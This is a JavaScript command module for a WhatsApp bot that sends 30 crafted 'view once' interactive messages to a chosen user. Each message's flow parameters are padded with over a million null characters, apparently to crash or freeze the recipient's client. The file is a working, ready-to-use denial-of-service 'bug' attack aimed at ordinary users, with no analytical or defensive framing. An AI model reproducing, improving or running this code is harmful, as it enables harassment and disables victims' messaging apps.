// commands/bug/fuck.js
async function sendBug(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: " Digital Crew 243 ", format: "EXTENSIONS_1" },
          nativeFlowResponseMessage: {
            name: 'galaxy_message',
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

export default {
  name: 'fuck',
  description: 'Bug d\'un utilisateur (danger)',
  cooldown: 60,
  async execute(sock, msg, args) {
    try {
      const remoteJid = msg.key.remoteJid;
      await sock.sendMessage(remoteJid, { text: "Attempting to bug the target" });
      let participant;
      if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        participant = msg.message.extendedTextMessage.contextInfo.participant;
      } else if (args[0]) {
        participant = args[0].replace('@', '') + '@s.whatsapp.net';
      } else {
        throw new Error('Specify the person to bug.');
      }
      for (let i = 0; i < 30; i++) {
        await sendBug(sock, participant);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    } catch (error) {
      console.error(error);
      await sock.sendMessage(msg.key.remoteJid, { text: `An error occurred: ${error.message}` });
    }
  }
};